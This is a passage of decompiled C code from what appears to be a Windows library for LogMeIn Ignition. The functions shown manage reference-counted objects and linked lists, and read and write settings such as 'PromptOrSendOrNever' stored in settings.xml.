      if (local_fc == 0) {
LAB_10039ed2:
        ppiVar9 = local_f0 + local_f8 * 2 + 2;
        if (ppiVar9 != &local_f4) {
          local_f4 = *ppiVar9;
          *ppiVar9 = piVar8;
          local_f0[0] = *(int **)(local_e0 + local_f8 * 8 + -4);
          *(int **)(local_e0 + local_f8 * 8 + -4) = local_f0[1];
          local_f0[1] = local_f0[0];
          piVar8 = local_f4;
        }
        if (local_f8 == local_fc) {
          local_fc = local_fc + 1;
        }
      }
      else {
        ppiVar9 = local_f0;
        do {
          ppiVar9 = (int **)((int)ppiVar9 + 8);
          if (ppiVar9[1] == (int *)0x0) break;
          FUN_1003a000(&local_f4,local_f0[1]);
          if (ppiVar9 == &local_f4) {
            local_f0[1] = local_f0[0];
          }
          else {
            piVar1 = *ppiVar9;
            *ppiVar9 = local_f4;
            local_f0[1] = ppiVar9[1];
            ppiVar9[1] = local_f0[0];
            local_f0[0] = local_f0[1];
            local_f4 = piVar1;
          }
          uVar11 = uVar11 + 1;
          piVar8 = local_f4;
          local_f0[1] = local_f0[0];
        } while (uVar11 < local_fc);
        local_f8 = uVar11;
        if (uVar11 != 0x19) goto LAB_10039ed2;
        FUN_1003a000(&local_f4,local_f0[1]);
        local_f0[1] = local_f0[0];
        piVar8 = local_f4;
      }
      piVar4 = local_f0[1];
      piVar1 = param_1[1];
    }
    if (1 < local_fc) {
      iVar10 = local_fc - 1;
      puVar12 = local_e0;
      ppiVar9 = param_1;
      do {
        FUN_1003a000(puVar12 + -8,ppiVar9);
        puVar12 = puVar12 + 8;
        iVar10 = iVar10 + -1;
        ppiVar9 = extraout_ECX;
      } while (iVar10 != 0);
    }
    ppiVar9 = local_f0 + local_fc * 2;
    if ((param_1 != ppiVar9) && (local_f0[local_fc * 2 + 1] != (int *)0x0)) {
      FUN_10023220(**param_1,ppiVar9,**ppiVar9,*ppiVar9,local_f0[local_fc * 2 + 1]);
    }
    local_8 = local_8 & 0xffffff00;
    _eh_vector_destructor_iterator_(local_f0 + 2,8,0x1a,FUN_10039bb0);
    piVar1 = (int *)*piVar8;
    *piVar8 = (int)piVar8;
    piVar8[1] = (int)piVar8;
    while (piVar1 != piVar8) {
      piVar4 = (int *)piVar1[3];
      piVar5 = (int *)*piVar1;
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar10 = *piVar4;
        *piVar4 = iVar10 + -1;
        UNLOCK();
        if (iVar10 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      thunk_FUN_100579ee(piVar1);
      piVar1 = piVar5;
    }
    thunk_FUN_100579ee(piVar8);
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_1003a000 */

void __thiscall FUN_1003a000(int *param_1,int *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  
  if (param_2 != param_1) {
    puVar1 = (undefined4 *)*param_1;
    puVar2 = (undefined4 *)*param_2;
    puVar3 = (undefined4 *)*puVar1;
    puVar5 = (undefined4 *)*puVar2;
    while (puVar3 != puVar1) {
      if (puVar5 == puVar2) {
        return;
      }
      if ((uint)puVar3[2] < (uint)puVar5[2]) {
        puVar4 = (undefined4 *)*puVar5;
        FUN_10023220(puVar3,param_2,puVar5,puVar4,1);
        puVar5 = puVar4;
      }
      else {
        puVar3 = (undefined4 *)*puVar3;
      }
    }
    if (puVar5 != puVar2) {
      FUN_10023220(puVar1,param_2,puVar5,puVar2,param_2[1]);
    }
  }
  return;
}



/* Function: FUN_1003a080 */

int FUN_1003a080(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = FUN_10018da0(param_1,param_2);
  if ((undefined4 *)(iVar2 + 8) != (undefined4 *)0x0) {
    *(undefined4 *)(iVar2 + 8) = *param_3;
    piVar1 = (int *)param_3[1];
    *(int **)(iVar2 + 0xc) = piVar1;
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
  }
  return iVar2;
}



/* Function: FUN_1003a0c0 */

undefined * __fastcall FUN_1003a0c0(undefined4 param_1)

{
  uint uVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_1007706e;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((DAT_1009b5d4 & 1) == 0) {
    DAT_1009b5d4 = DAT_1009b5d4 | 1;
    local_8 = 0;
    FUN_1001be20(param_1);
    DAT_1009b5fc = 0;
    DAT_1009b600 = 0;
    FUN_10057b51(&LAB_10078890,uVar1);
  }
  ExceptionList = local_10;
  return &DAT_1009b5d8;
}



/* Function: FUN_1003a140 */

int __thiscall FUN_1003a140(int param_1,undefined4 param_2)

{
  FUN_1001be20(param_2);
  *(undefined4 *)(param_1 + 0x24) = 0;
  *(undefined4 *)(param_1 + 0x28) = 0;
  return param_1;
}



/* Function: FUN_1003a170 */

void __fastcall FUN_1003a170(int param_1)

{
  int iVar1;
  int *piVar2;
  
  if (*(int *)(param_1 + 0x24) != 0) {
    FUN_1003a1b0(*(int *)(param_1 + 0x24));
  }
  piVar2 = *(int **)(param_1 + 0x28);
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  FUN_1001cff0();
  return;
}



/* Function: FUN_1003a1b0 */

undefined4 * __fastcall FUN_1003a1b0(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  FUN_1003ad10();
  thunk_FUN_100579ee(param_1[0xe]);
  FUN_1003a250();
  piVar2 = (int *)param_1[1];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  thunk_FUN_100579ee(param_1);
  return param_1;
}



/* Function: FUN_1003a210 */

void __fastcall FUN_1003a210(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  
  FUN_1003a250();
  piVar2 = (int *)param_1[1];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_1003a250 */

void __fastcall FUN_1003a250(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 *local_8;
  
  piVar2 = (int *)param_1[7];
  local_8 = param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  piVar2 = (int *)param_1[6];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  FUN_1001d3f0(&local_8,*(undefined4 *)param_1[4],(undefined4 *)param_1[4]);
  thunk_FUN_100579ee(param_1[4]);
  FUN_1003acc0();
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return;
}



/* Function: FUN_1003a2d0 */

void __thiscall FUN_1003a2d0(int param_1,undefined4 param_2,int *param_3)

{
  char cVar1;
  int **ppiVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 uVar6;
  undefined4 uVar7;
  wchar_t *pwVar8;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  int **local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100770aa;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if (*(int *)(param_1 + 0x20) != 2) {
    FUN_1001c240(param_1,param_3);
    ExceptionList = local_10;
    return;
  }
  local_14 = (int *)FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  local_8 = 0;
  ppiVar2 = (int **)FUN_1001d340(&local_14);
  if ((ppiVar2 == *(int ***)(param_1 + 0xc)) ||
     (cVar1 = FUN_1001d1f0(&local_14,ppiVar2 + 4), cVar1 != '\0')) {
    local_18 = &local_14;
    iVar3 = FUN_1001daa0(&local_18,&local_18,local_18);
    FUN_1001dae0(&local_18,ppiVar2,iVar3 + 0x10,iVar3);
    ppiVar2 = local_18;
  }
  ppiVar2[5] = param_3;
  local_8 = 0xffffffff;
  if (local_14 != (int *)0x0) {
    LOCK();
    iVar3 = *local_14;
    *local_14 = *local_14 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_14);
    }
  }
  if (*(int *)(param_1 + 0x24) == 0) {
    local_18 = (int **)FUN_10058463(0x40,&DAT_10098020);
    local_8 = 1;
    if (local_18 == (int **)0x0) {
      iVar3 = 0;
    }
    else {
      uVar4 = FUN_1003abd0();
      iVar3 = FUN_1003c970(uVar4);
    }
    local_8 = 0xffffffff;
    *(int *)(param_1 + 0x24) = iVar3;
    if (iVar3 == 0) {
      ExceptionList = local_10;
      return;
    }
    FUN_1003ade0();
    FUN_1003aff0();
  }
  if ((((*(int *)(param_1 + 0x24) != 0) &&
       (iVar3 = FUN_1003cb30(*(int *)(param_1 + 0x24),&DAT_10088e54), iVar3 != 0)) &&
      (iVar3 = FUN_1003cb30(extraout_ECX,&DAT_10088e54), iVar3 != 0)) &&
     (iVar3 = FUN_1003cb30(extraout_ECX_00,L"Software"), iVar3 != 0)) {
    pwVar8 = L"Software";
    uVar4 = extraout_ECX_01;
    FUN_1003cb30(extraout_ECX_01,&DAT_10088e54);
    iVar3 = FUN_1003cb30(uVar4,pwVar8);
    if ((iVar3 != 0) && (iVar3 = FUN_1003cb30(extraout_ECX_02,L"LogMeIn Ignition"), iVar3 != 0)) {
      pwVar9 = L"LogMeIn Ignition";
      pwVar8 = L"Software";
      uVar4 = extraout_ECX_03;
      uVar6 = extraout_ECX_03;
      FUN_1003cb30(extraout_ECX_03,&DAT_10088e54);
      FUN_1003cb30(uVar4,pwVar8);
      iVar3 = FUN_1003cb30(uVar6,pwVar9);
      if ((iVar3 != 0) && (iVar3 = FUN_1003cb30(extraout_ECX_04,L"Settings"), iVar3 != 0)) {
        pwVar10 = L"Settings";
        pwVar9 = L"LogMeIn Ignition";
        pwVar8 = L"Software";
        uVar4 = extraout_ECX_05;
        uVar6 = extraout_ECX_05;
        uVar7 = extraout_ECX_05;
        FUN_1003cb30(extraout_ECX_05,&DAT_10088e54);
        FUN_1003cb30(uVar4,pwVar8);
        FUN_1003cb30(uVar6,pwVar9);
        FUN_1003cb30(uVar7,pwVar10);
        iVar3 = FUN_1003cb10(extraout_ECX_06,L"PromptOrSendOrNever");
        if (iVar3 == 0) {
          FUN_1003cd30(L"dword",extraout_ECX_07,L"PromptOrSendOrNever");
        }
        else {
          FUN_1003cb30(extraout_ECX_07,L"PromptOrSendOrNever");
        }
        puVar5 = (undefined4 *)FUN_1003cce0();
        uVar4 = FUN_10039c20(param_3,extraout_ECX_08);
        *puVar5 = uVar4;
        FUN_1003b770();
      }
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1003a570 */

undefined4 __thiscall
FUN_1003a570(int param_1,short *param_2,int *param_3,int *param_4,int *param_5)

{
  char cVar1;
  undefined4 uVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  wchar_t *pwVar7;
  undefined4 uVar8;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  undefined4 uVar11;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100770ea;
  local_10 = ExceptionList;
  if (*(int *)(param_1 + 0x20) == 2) {
    if (param_4 == (int *)0x1) {
      return param_3;
    }
    if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
      ExceptionList = &local_10;
      piVar3 = (int *)FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    }
    else {
      ExceptionList = &local_10;
      piVar3 = (int *)FUN_1000ba60();
    }
    param_4 = piVar3;
    param_5 = (int *)(param_1 + 0xc);
    iVar4 = FUN_1001d340(&param_4);
    iVar5 = *(int *)(param_1 + 0xc);
    if ((iVar4 == iVar5) ||
       (cVar1 = FUN_1001d1f0(&param_4,iVar4 + 0x10), param_4 = (int *)iVar4, cVar1 != '\0')) {
      param_4 = (int *)iVar5;
    }
    iVar5 = (int)param_4;
    if (piVar3 != (int *)0x0) {
      LOCK();
      iVar4 = *piVar3;
      *piVar3 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(piVar3);
      }
    }
    if (*param_5 != iVar5) {
      ExceptionList = local_10;
      return *(undefined4 *)(iVar5 + 0x14);
    }
    if (*(int *)(param_1 + 0x24) == 0) {
      param_4 = (int *)FUN_10058463(0x40,&DAT_10098020);
      local_8 = 0;
      if (param_4 == (int *)0x0) {
        iVar5 = 0;
      }
      else {
        uVar2 = FUN_1003abd0();
        iVar5 = FUN_1003c970(uVar2);
      }
      local_8 = 0xffffffff;
      *(int *)(param_1 + 0x24) = iVar5;
      if (iVar5 == 0) {
        ExceptionList = local_10;
        return param_3;
      }
      FUN_1003ade0();
      FUN_1003aff0();
    }
    uVar2 = param_3;
    if ((((*(int *)(param_1 + 0x24) != 0) &&
         (iVar5 = FUN_1003cb30(*(int *)(param_1 + 0x24),&DAT_10088e54), uVar2 = param_3, iVar5 != 0)
         ) && (iVar5 = FUN_1003cb30(extraout_ECX,&DAT_10088e54), uVar2 = param_3, iVar5 != 0)) &&
       (iVar5 = FUN_1003cb30(extraout_ECX_00,L"Software"), uVar2 = param_3, iVar5 != 0)) {
      pwVar9 = L"LogMeIn Ignition";
      pwVar7 = L"Software";
      uVar2 = extraout_ECX_01;
      uVar11 = extraout_ECX_01;
      FUN_1003cb30(extraout_ECX_01,&DAT_10088e54);
      FUN_1003cb30(uVar2,pwVar7);
      iVar5 = FUN_1003cb10(uVar11,pwVar9);
      uVar2 = param_3;
      if (iVar5 != 0) {
        pwVar10 = L"Settings";
        pwVar9 = L"LogMeIn Ignition";
        pwVar7 = L"Software";
        uVar2 = extraout_ECX_02;
        uVar11 = extraout_ECX_02;
        uVar8 = extraout_ECX_02;
        FUN_1003cb30(extraout_ECX_02,&DAT_10088e54);
        FUN_1003cb30(uVar2,pwVar7);
        FUN_1003cb30(uVar11,pwVar9);
        iVar5 = FUN_1003cb10(uVar8,pwVar10);
        uVar2 = param_3;
        if (iVar5 != 0) {
          pwVar10 = L"Settings";
          pwVar9 = L"LogMeIn Ignition";
          pwVar7 = L"Software";
          uVar2 = extraout_ECX_03;
          uVar11 = extraout_ECX_03;
          uVar8 = extraout_ECX_03;
          FUN_1003cb30(extraout_ECX_03,&DAT_10088e54);
          FUN_1003cb30(uVar2,pwVar7);
          FUN_1003cb30(uVar11,pwVar9);
          FUN_1003cb30(uVar8,pwVar10);
          iVar5 = FUN_1003cb10(extraout_ECX_04,param_2);
          if (iVar5 == 0) {
            FUN_1003cd30(L"dword",extraout_ECX_05,param_2);
            puVar6 = (undefined4 *)FUN_1003cce0();
            uVar2 = param_3;
            uVar11 = FUN_10039c20(param_3,extraout_ECX_06);
            *puVar6 = uVar11;
          }
          else {
            uVar2 = extraout_ECX_05;
            FUN_1003cb30(extraout_ECX_05,param_2);
            uVar11 = 0x1003a7d0;
            FUN_1003cce0();
            uVar2 = FUN_10039b90(uVar2,uVar11);
            param_3 = (int *)uVar2;
          }
        }
      }
    }
    if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
      param_3 = (int *)FUN_1000bd10();
    }
    else {
      param_3 = (int *)FUN_1000ba60();
    }
    local_8 = 1;
    puVar6 = (undefined4 *)FUN_1001d0f0(&param_3);
    *puVar6 = uVar2;
    if (param_3 != (int *)0x0) {
      LOCK();
      iVar5 = *param_3;
      *param_3 = *param_3 + -1;
      UNLOCK();
      if (iVar5 + -1 < 0) {
        FUN_100579ee(param_3);
      }
    }
  }
  else {
    ExceptionList = &local_10;
    uVar2 = FUN_1001c390(param_2,param_3,param_4,param_5);
  }
  ExceptionList = local_10;
  return uVar2;
}



/* Function: FUN_1003a870 */

void __thiscall FUN_1003a870(int param_1,int *param_2,undefined4 *param_3,int *param_4,int *param_5)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 uVar8;
  wchar_t *pwVar9;
  undefined4 uVar10;
  wchar_t *pwVar11;
  wchar_t *pwVar12;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10077132;
  local_10 = ExceptionList;
  if (*(int *)(param_1 + 0x20) != 2) {
    ExceptionList = &local_10;
    FUN_1001c6f0(param_2,param_3,param_4,param_5);
    ExceptionList = local_10;
    return;
  }
  if (param_4 == (int *)0x1) {
    return;
  }
  if ((param_2 == (int *)0x0) || ((short)*param_2 != 0)) {
    ExceptionList = &local_10;
    piVar2 = (int *)FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  }
  else {
    ExceptionList = &local_10;
    piVar2 = (int *)FUN_1000ba60();
  }
  param_4 = piVar2;
  param_5 = (int *)(param_1 + 0x14);
  iVar3 = FUN_1001d340(&param_4);
  iVar5 = *(int *)(param_1 + 0x14);
  if ((iVar3 == iVar5) ||
     (cVar1 = FUN_1001d1f0(&param_4,iVar3 + 0x10), param_4 = (int *)iVar3, cVar1 != '\0')) {
    param_4 = (int *)iVar5;
  }
  iVar5 = (int)param_4;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar3 = *piVar2;
    *piVar2 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  puVar6 = param_3;
  if (*param_5 != iVar5) {
    uVar4 = FUN_10010440(*(undefined4 *)(iVar5 + 0x14));
    *puVar6 = uVar4;
    ExceptionList = local_10;
    return;
  }
  if (*(int *)(param_1 + 0x24) == 0) {
    param_4 = (int *)FUN_10058463(0x40,&DAT_10098020);
    local_8 = 0;
    if (param_4 == (int *)0x0) {
      iVar5 = 0;
    }
    else {
      uVar4 = FUN_1003abd0();
      iVar5 = FUN_1003c970(uVar4);
    }
    local_8 = 0xffffffff;
    *(int *)(param_1 + 0x24) = iVar5;
    if (iVar5 == 0) {
      FUN_1000ad00(param_2,0xffffffff);
      local_8 = 1;
      puVar6 = (undefined4 *)FUN_1001d190(&param_2);
      uVar4 = FUN_10010440(*param_3);
      *puVar6 = uVar4;
      if (param_2 == (int *)0x0) {
        ExceptionList = local_10;
        return;
      }
      LOCK();
      iVar5 = *param_2;
      *param_2 = *param_2 + -1;
      UNLOCK();
      goto joined_r0x1003aba9;
    }
    FUN_1003ade0();
    FUN_1003aff0();
  }
  puVar6 = param_3;
  if ((((*(int *)(param_1 + 0x24) != 0) &&
       (iVar5 = FUN_1003cb30(*(int *)(param_1 + 0x24),&DAT_10088e54), iVar5 != 0)) &&
      (iVar5 = FUN_1003cb30(extraout_ECX,&DAT_10088e54), iVar5 != 0)) &&
     (iVar5 = FUN_1003cb30(extraout_ECX_00,L"Software"), iVar5 != 0)) {
    pwVar11 = L"LogMeIn Ignition";
    pwVar9 = L"Software";
    uVar4 = extraout_ECX_01;
    uVar8 = extraout_ECX_01;
    FUN_1003cb30(extraout_ECX_01,&DAT_10088e54);
    FUN_1003cb30(uVar4,pwVar9);
    iVar5 = FUN_1003cb10(uVar8,pwVar11);
    if (iVar5 != 0) {
      pwVar12 = L"Settings";
      pwVar11 = L"LogMeIn Ignition";
      pwVar9 = L"Software";
      uVar4 = extraout_ECX_02;
      uVar8 = extraout_ECX_02;
      uVar10 = extraout_ECX_02;
      FUN_1003cb30(extraout_ECX_02,&DAT_10088e54);
      FUN_1003cb30(uVar4,pwVar9);
      FUN_1003cb30(uVar8,pwVar11);
      iVar5 = FUN_1003cb10(uVar10,pwVar12);
      if (iVar5 != 0) {
        pwVar12 = L"Settings";
        pwVar11 = L"LogMeIn Ignition";
        pwVar9 = L"Software";
        uVar4 = extraout_ECX_03;
        uVar8 = extraout_ECX_03;
        uVar10 = extraout_ECX_03;
        FUN_1003cb30(extraout_ECX_03,&DAT_10088e54);
        FUN_1003cb30(uVar4,pwVar9);
        FUN_1003cb30(uVar8,pwVar11);
        FUN_1003cb30(uVar10,pwVar12);
        piVar2 = param_2;
        iVar5 = FUN_1003cb10(extraout_ECX_04,param_2);
        if (iVar5 == 0) {
          FUN_1003cd30(L"string",extraout_ECX_05,piVar2);
          puVar7 = (undefined4 *)FUN_1003cce0();
          uVar4 = FUN_10010440(*puVar6);
          *puVar7 = uVar4;
        }
        else {
          FUN_1003cb30(extraout_ECX_05,piVar2);
          puVar7 = (undefined4 *)FUN_1003cce0();
          uVar4 = FUN_10010440(*puVar7);
          *puVar6 = uVar4;
        }
      }
    }
  }
  if ((param_2 == (int *)0x0) || ((short)*param_2 != 0)) {
    param_2 = (int *)FUN_1000bd10();
  }
  else {
    param_2 = (int *)FUN_1000ba60();
  }
  local_8 = 2;
  puVar7 = (undefined4 *)FUN_1001d190(&param_2);
  uVar4 = FUN_10010440(*puVar6);
  *puVar7 = uVar4;
  if (param_2 == (int *)0x0) {
    ExceptionList = local_10;
    return;
  }
  LOCK();
  iVar5 = *param_2;
  *param_2 = *param_2 + -1;
  UNLOCK();
joined_r0x1003aba9:
  if (iVar5 + -1 < 0) {
    FUN_100579ee(param_2);
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1003abd0 */

int __fastcall FUN_1003abd0(int param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 *puVar3;
  int *piVar4;
  int *piVar5;
  undefined4 uVar6;
  undefined4 extraout_ECX;
  int *local_10;
  int local_8;
  
  puVar3 = (undefined4 *)FUN_10021a40(0,0);
  piVar2 = (int *)*puVar3;
  if (piVar2 != (int *)0x0) {
    LOCK();
    *piVar2 = *piVar2 + 1;
    UNLOCK();
  }
  if (local_10 != (int *)0x0) {
    LOCK();
    iVar1 = *local_10;
    *local_10 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(local_10);
    }
  }
  if (((piVar2 == (int *)0x0) || (piVar2 + 3 == (int *)0x0)) || ((short)piVar2[3] != 0)) {
    piVar4 = (int *)FUN_1000bd10();
  }
  else {
    piVar4 = (int *)FUN_1000ba60();
  }
  FUN_1000c820(1);
  if (piVar4 == (int *)0x0) {
    piVar5 = (int *)0x0;
  }
  else {
    piVar5 = piVar4 + 3;
  }
  uVar6 = FUN_1000bdd0(piVar5,extraout_ECX);
  *(undefined4 *)(param_1 + 0x28) = uVar6;
  local_8 = FUN_1000bfa0(L"settings.xml",0xffffffff);
  *(int *)(param_1 + 0x28) = local_8;
  if (local_8 == 0) {
    local_8 = 0;
  }
  else {
    local_8 = local_8 + 0xc;
  }
  if (piVar4 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar4;
    *piVar4 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar4);
    }
  }
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    *piVar2 = *piVar2 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(piVar2);
    }
  }
  return local_8;
}



/* Function: FUN_1003acc0 */

void __fastcall FUN_1003acc0(int *param_1)

{
  int *piVar1;
  int *piVar2;
  
  piVar1 = (int *)*param_1;
  piVar2 = (int *)*piVar1;
  *piVar1 = (int)piVar1;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar2 != (int *)*param_1) {
    do {
      piVar1 = (int *)*piVar2;
      FUN_1003c940();
      thunk_FUN_100579ee(piVar2);
      piVar2 = piVar1;
    } while (piVar1 != (int *)*param_1);
  }
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_1003ad10 */

void __fastcall FUN_1003ad10(int *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 *puVar3;
  int *piVar4;
  int *piVar5;
  
  piVar2 = (int *)*param_1;
  piVar5 = (int *)*piVar2;
  *piVar2 = (int)piVar2;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar5 != (int *)*param_1) {
    do {
      puVar3 = (undefined4 *)piVar5[2];
      piVar2 = (int *)*piVar5;
      if (puVar3 != (undefined4 *)0x0) {
        FUN_1003ad10();
        FUN_1003adc0(puVar3[0xe]);
        FUN_1003a250();
        piVar4 = (int *)puVar3[1];
        if (piVar4 != (int *)0x0) {
          LOCK();
          iVar1 = *piVar4;
          *piVar4 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(piVar4);
          }
        }
        piVar4 = (int *)*puVar3;
        if (piVar4 != (int *)0x0) {
          LOCK();
          iVar1 = *piVar4;
          *piVar4 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(piVar4);
          }
        }
        thunk_FUN_100579ee(puVar3);
      }
      piVar5[2] = 0;
      thunk_FUN_100579ee(piVar5);
      piVar5 = piVar2;
    } while (piVar2 != (int *)*param_1);
  }
  return;
}



/* Function: FUN_1003adc0 */

void FUN_1003adc0(undefined4 param_1)

{
  thunk_FUN_100579ee(param_1);
  return;
}



/* Function: FUN_1003ade0 */

void __fastcall FUN_1003ade0(int param_1)

{
  int *piVar1;
  char *_Filename;
  FILE *_File;
  int iVar2;
  void *_DstBuf;
  int *local_54;
  size_t local_50;
  int *local_48;
  int *local_44 [6];
  size_t local_2c;
  uint local_c;
  
  local_c = DAT_100956e0 ^ (uint)&local_54;
  piVar1 = (int *)FUN_1000ae10(local_44);
  if (*piVar1 == 0) {
    _Filename = (char *)0x0;
  }
  else {
    _Filename = (char *)(*piVar1 + 0xc);
  }
  _File = _fopen(_Filename,"rb");
  if (local_44[0] != (int *)0x0) {
    LOCK();
    iVar2 = *local_44[0];
    *local_44[0] = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(local_44[0]);
    }
  }
  if (_File == (FILE *)0x0) {
    piVar1 = (int *)FUN_1000ae10(&local_54);
    if (*piVar1 == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = *piVar1 + 0xc;
    }
    FUN_10006250("error in opening \'%s\' for reading\n",iVar2);
    if (local_54 != (int *)0x0) {
      LOCK();
      iVar2 = *local_54;
      *local_54 = *local_54 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(local_54);
        FUN_100579df();
        return;
      }
    }
    goto LAB_1003afd5;
  }
  FUN_100213b0(param_1);
  local_54 = *(int **)(param_1 + 4);
  local_50 = local_2c;
  if (local_54 == (int *)0x0) {
LAB_1003aed9:
    local_54 = (int *)0x0;
  }
  else {
    if (*local_54 != 0) {
      LOCK();
      iVar2 = *local_54;
      *local_54 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(local_54);
      }
      goto LAB_1003aed9;
    }
    local_54[2] = 0;
    *(undefined1 *)(local_54 + 3) = 0;
  }
  *(int **)(param_1 + 4) = local_54;
  iVar2 = FUN_100074a0(local_50 + 1,1);
  *(int *)(param_1 + 4) = iVar2;
  if (iVar2 == 0) {
    if (local_54 != (int *)0x0) {
      LOCK();
      iVar2 = *local_54;
      *local_54 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(local_54);
      }
    }
    if (*(int *)(param_1 + 4) == 0) goto LAB_1003afd5;
  }
  if ((*(int *)(param_1 + 4) != 0) &&
     (_DstBuf = (void *)(*(int *)(param_1 + 4) + 0xc), _DstBuf != (void *)0x0)) {
    local_54 = (int *)_fread(_DstBuf,1,local_50,_File);
    if (((int)local_54 < (int)local_50) && (iVar2 = _feof(_File), iVar2 == 0)) {
